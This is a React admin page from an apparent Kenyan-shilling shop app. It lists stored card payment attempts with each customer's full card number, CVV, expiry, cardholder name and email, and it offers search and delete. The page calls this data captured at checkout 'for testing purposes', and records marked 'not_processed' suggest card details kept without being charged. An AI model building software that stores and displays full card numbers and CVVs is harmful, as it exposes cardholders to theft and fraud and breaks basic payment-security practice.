import React, { useEffect, useMemo, useState } from 'react'
import { useToast } from '@/hooks/useToast'
import { CardBrandLogo } from '@/components/shop/CardLogos'
import { formatKES } from '@/data/shopProducts'
import { listCardPayments, deleteCardPayment } from '@/services/shopService'
import { CreditCard, RefreshCw, Search, Trash2 } from 'lucide-react'

const statusBadge = (status) => {
  const styles = {
    not_processed: 'bg-yellow-100 text-yellow-800',
    paid: 'bg-green-100 text-green-800',
    failed: 'bg-red-100 text-red-800',
  }
  return (
    <span className={`inline-flex rounded-full px-2 py-1 text-xs font-medium ${styles[status] || 'bg-gray-100 text-gray-800'}`}>
      {String(status || 'unknown').replace(/_/g, ' ')}
    </span>
  )
}

export default function AdminCardPaymentsPage() {
  const { success, error } = useToast()
  const [loading, setLoading] = useState(true)
  const [payments, setPayments] = useState([])
  const [query, setQuery] = useState('')

  const load = async () => {
    setLoading(true)
    try {
      setPayments(await listCardPayments())
    } catch (err) {
      
      error('Error', 'Failed to load card payment attempts')
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
    load()
  }, [])

  const handleDelete = async (id) => {
    try {
      await deleteCardPayment(id)
      setPayments((rows) => rows.filter((r) => r.id !== id))
      success('Deleted', 'Card payment record removed')
    } catch (err) {
      
      error('Failed', 'Could not delete the record')
    }
  }

  const filtered = useMemo(() => {
    const q = query.trim().toLowerCase()
    if (!q) return payments
    return payments.filter((p) =>
      [p.reference, p.customer_name, p.customer_email, p.cardholder_name, p.card_last4]
        .filter(Boolean)
        .some((v) => String(v).toLowerCase().includes(q))
    )
  }, [payments, query])

  return (
    <div>
      <div className="mb-6 flex items-start justify-between gap-4">
        <div>
          <h1 className="text-2xl font-bold text-gray-900">Cards</h1>
          <p className="mt-1 text-gray-600">
            View all card details captured during checkout for testing purposes.
          </p>
        </div>
        <button onClick={load} disabled={loading} className="flex items-center gap-2 rounded-lg border border-gray-200 px-4 py-2.5 text-sm font-semibold text-gray-700 hover:bg-gray-50">
          <RefreshCw className={`mr-2 h-4 w-4 ${loading ? 'animate-spin' : ''}`} /> Refresh
        </button>
      </div>

      <div className="rounded-lg border border-gray-200 bg-white">
        <div className="flex items-center justify-between gap-3 border-b border-gray-200 p-4">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-400" />
            <input
              type="text"
              placeholder="Search attempts..."
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              className="rounded-lg border border-gray-300 py-2 pl-10 pr-4 focus:border-transparent focus:ring-2 focus:ring-black"
            />
          </div>
          <div className="text-sm text-gray-500">Total: {filtered.length}</div>
        </div>

        {loading ? (
          <div className="flex h-48 items-center justify-center">
            <div className="h-8 w-8 animate-spin rounded-full border-4 border-gray-200 border-t-black" />
          </div>
        ) : filtered.length === 0 ? (
          <div className="flex flex-col items-center py-16 text-gray-500">
            <CreditCard className="mb-2 h-8 w-8 text-gray-300" />
            <p className="text-sm">No card payment attempts yet.</p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-50">
                <tr>
                  {['Date', 'Reference', 'Customer', 'Cardholder', 'Card Number', 'Brand', 'Expiry', 'CVV', 'Amount', 'Items', 'Status', ''].map((h) => (
                    <th key={h} className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200">
                {filtered.map((p) => (
                  <tr key={p.id} className="hover:bg-gray-50">
                    <td className="whitespace-nowrap px-4 py-3 text-sm text-gray-500">
                      {p.created_at ? new Date(p.created_at).toLocaleString() : '—'}
                    </td>
                    <td className="px-4 py-3 text-sm font-medium text-gray-900">{p.reference || '—'}</td>
                    <td className="px-4 py-3">
                      <div className="text-sm font-medium text-gray-900">{p.customer_name}</div>
                      <div className="text-xs text-gray-500">{p.customer_email}</div>
                    </td>
                    <td className="px-4 py-3 text-sm text-gray-900">{p.cardholder_name}</td>
                    <td className="px-4 py-3 text-sm text-gray-900 font-mono">{p.card_number || '—'}</td>
                    <td className="px-4 py-3">
                      <CardBrandLogo brand={p.card_brand} className="h-5 w-auto" />
                    </td>
                    <td className="whitespace-nowrap px-4 py-3 text-sm text-gray-500">
                      {p.exp_month}/{String(p.exp_year || '').slice(-2)}
                    </td>
                    <td className="whitespace-nowrap px-4 py-3 text-sm text-gray-900 font-mono">{p.card_cvv || '—'}</td>
                    <td className="whitespace-nowrap px-4 py-3 text-sm font-medium text-gray-900">{formatKES(p.amount)}</td>
                    <td className="max-w-[220px] truncate px-4 py-3 text-sm text-gray-500" title={p.items_summary}>
                      {p.items_summary}
                    </td>
                    <td className="px-4 py-3">{statusBadge(p.status)}</td>
                    <td className="px-4 py-3">
                      <button onClick={() => handleDelete(p.id)} className="rounded-lg p-1.5 text-red-500 hover:bg-red-50">
                        <Trash2 className="h-4 w-4" />
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  )
}
